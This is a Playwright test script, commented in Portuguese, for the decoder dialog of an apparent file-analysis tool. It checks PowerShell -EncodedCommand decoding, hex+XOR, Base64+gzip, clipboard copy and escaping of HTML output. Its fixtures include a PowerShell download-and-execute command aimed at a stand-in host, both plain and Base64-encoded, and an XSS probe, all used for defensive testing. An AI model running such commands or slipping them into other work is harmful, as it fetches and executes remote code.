// Decodificador (85): Ctrl+Shift+D (vazio e com o texto selecionado), menu
// Mais, foco, PowerShell -EncodedCommand, sugestao do proximo passo, hex + XOR,
// Base64 + gzip, erro marcado no passo, aba Hex, Copiar leva o resultado,
// resultado como texto (HTML nao vira HTML), Esc devolve o foco, a camada do
// script abre no decodificador e o atalho esta na lista.
import { chromium } from 'playwright';

import { createState, entries, ORIGIN, OUT, setupMock, watchErrors } from './mock-api.mjs';

const browser = await chromium.launch();
const context = await browser.newContext({
  viewport: { width: 1440, height: 900 },
  permissions: ['clipboard-read', 'clipboard-write'],
});
await context.addInitScript(() => {
  window.alert = () => {
    window.__alerted = true;
  };
});
const state = createState({ loggedIn: true });
const PS = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a')";
const PS_B64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBhACcAKQA=';
const GZ = 'H4sIAAAAAAAACitOTS9KTclXSMlXKEiszMlPTAEASjNSzhIAAAA=';
entries[2].staticInfo = {
  version: 1, analyzedAt: '2026-10-29T10:00:00.000Z', size: 420, bytesAnalyzed: 420,
  detectedType: null, extensionMismatch: null, entropy: 5.2, entropyLevel: 'normal',
  strings: { total: 1, urls: [], ips: [], emails: [], paths: [], registry: [], suspicious: [] }, pe: null, iocCandidates: [],
  script: {
    language: 'batch', lines: 2, risk: 'medium', encoded: false, urls: [],
    findings: [{ name: 'powershell -EncodedCommand', why: 'esconde o comando em Base64', kind: 'obfuscation', layer: 0 }],
    layers: [{ method: 'Base64 (bloco)', from: 0, text: PS_B64, truncated: false }],
  },
};
await setupMock(context, state);
const page = await context.newPage();
watchErrors(page);

let failures = 0;
const expect = (label, ok, detail = '') => {
  if (!ok) failures += 1;
  console.log(`${ok ? 'ok  ' : 'FALHA'} ${label}${detail ? ` (${detail})` : ''}`);
};
const settle = (ms = 300) => page.waitForTimeout(ms);
const dialog = page.locator('[role=dialog]:has(.hpsm-modal__head:text-is("Decodificar"))');
const out = dialog.locator('.dl-decoder__out');
const outText = async () => (await out.innerText()).trim();
const addStep = async (label) => {
  await page.selectOption('#decoder-add', { label });
  await settle(200);
};

// 1. Atalho sem selecao.
await page.goto(ORIGIN + '/entries/e1', { waitUntil: 'networkidle' });
await page.locator('body').click({ position: { x: 5, y: 5 } });
await page.keyboard.press('Control+Shift+D');
await settle();
expect('Ctrl+Shift+D abre', (await dialog.count()) === 1);
expect('foco no texto', await page.locator('#decoder-input').evaluate((el) => el === document.activeElement));

// 2. PowerShell -EncodedCommand e sugestao.
await page.fill('#decoder-input', PS_B64);
await settle(200);
expect('sugere Base64', (await dialog.locator('button:has-text("Sugestão:")').innerText()).includes('Base64'));
await dialog.locator('button:has-text("Sugestão:")').click();
await settle(200);
expect('depois do Base64 sugere UTF-16LE', (await dialog.locator('button:has-text("Sugestão:")').innerText()).includes('UTF-16LE'));
await page.selectOption('#decoder-step-0', 'psenc');
await settle(200);
expect('PowerShell -EncodedCommand decodificado', (await outText()) === PS, await outText());
await page.screenshot({ path: `${OUT}/decodificador.png` });

// 3. Hex + XOR e erro no passo.
await dialog.locator('button[aria-label="Tirar o passo 1"]').click();
await page.fill('#decoder-input', '48 45 4c 4c 4f');
await addStep('Hex');
await addStep('XOR');
await page.fill('#decoder-param-1', '0x20');
await settle(300);
expect('hex + XOR 0x20', (await outText()) === 'hello', await outText());
await page.fill('#decoder-input', 'zz');
await settle(300);
const err = await dialog.locator('.dl-decoder__error').innerText();
expect('erro marcado no passo que falhou', err.includes('não é hex') && (await dialog.locator('.dl-decoder__steps li').first().getAttribute('class')) === 'is-error', err);

// 4. Base64 + gzip, aba Hex e Copiar.
await dialog.locator('button[aria-label="Tirar o passo 2"]').click();
await dialog.locator('button[aria-label="Tirar o passo 1"]').click();
await page.fill('#decoder-input', GZ);
await addStep('Base64');
expect('sugere descompactar', (await dialog.locator('button:has-text("Sugestão:")').innerText()).includes('Descompactar'));
await addStep('Descompactar (gzip/zlib/deflate)');
await settle(400);
expect('Base64 + gzip', (await outText()) === 'segredo do payload', await outText());
await dialog.locator('[role=tab]:has-text("Hex")').click();
await settle(200);
expect('aba Hex com deslocamento', (await outText()).startsWith('00000000  73 65 67 72 65 64 6f'), await outText());
await dialog.locator('button[aria-label="Copiar resultado"]').click();
await settle(200);
expect('Copiar leva o texto', (await page.evaluate(() => navigator.clipboard.readText())) === 'segredo do payload');
await dialog.locator('[role=tab]:has-text("Texto")').click();

// 5. Resultado sempre texto.
await dialog.locator('button[aria-label="Tirar o passo 2"]').click();
await dialog.locator('button[aria-label="Tirar o passo 1"]').click();
await page.fill('#decoder-input', '<img src=x onerror=alert(1)>');
await settle(300);
expect('HTML aparece como texto', (await outText()) === '<img src=x onerror=alert(1)>' && (await out.locator('img').count()) === 0 && !(await page.evaluate(() => window.__alerted)));

// 6. Esc fecha.
await page.keyboard.press('Escape');
await settle(200);
expect('Esc fecha', (await dialog.count()) === 0);

// 7. Com texto selecionado.
await page.evaluate(() => {
  const el = [...document.querySelectorAll('.hpsm-readonly__text')].find((e) => /^[0-9a-f]{64}$/.test(e.textContent.trim()));
  const range = document.createRange();
  range.selectNodeContents(el);
  const sel = window.getSelection();
  sel.removeAllRanges();
  sel.addRange(range);
});
await page.keyboard.press('Control+Shift+D');
await settle();
expect('abre com a seleção', /^[0-9a-f]{64}$/.test((await page.inputValue('#decoder-input')).trim()), await page.inputValue('#decoder-input'));
await page.keyboard.press('Escape');

// 8. Menu Mais.
await page.click('.hpsm-toolbar__action[aria-haspopup="menu"]:has-text("Mais")');
await page.click('.hpsm-ctxmenu button:has-text("Decodificar texto…")');
await settle();
expect('menu Mais abre', (await dialog.count()) === 1);
await page.keyboard.press('Escape');

// 9. Camada do script.
await page.goto(ORIGIN + `/entries/${entries[2].id}`, { waitUntil: 'networkidle' });
await page.click('.dl-doc-macros button:has-text("Decodificar…")');
await settle();
expect('camada abre no decodificador', (await page.inputValue('#decoder-input')) === PS_B64);
await page.keyboard.press('Escape');

// 10. Lista de atalhos.
await page.locator('body').click({ position: { x: 5, y: 5 } });
await page.keyboard.press('F1');
await settle();
expect('atalho na lista', (await page.locator('[role=dialog]').innerText()).includes('Decodificar o texto selecionado'));

await browser.close();
console.log(failures ? `\n${failures} falha(s)` : '\ndecodificador: tudo ok');
process.exit(failures ? 1 : 0);
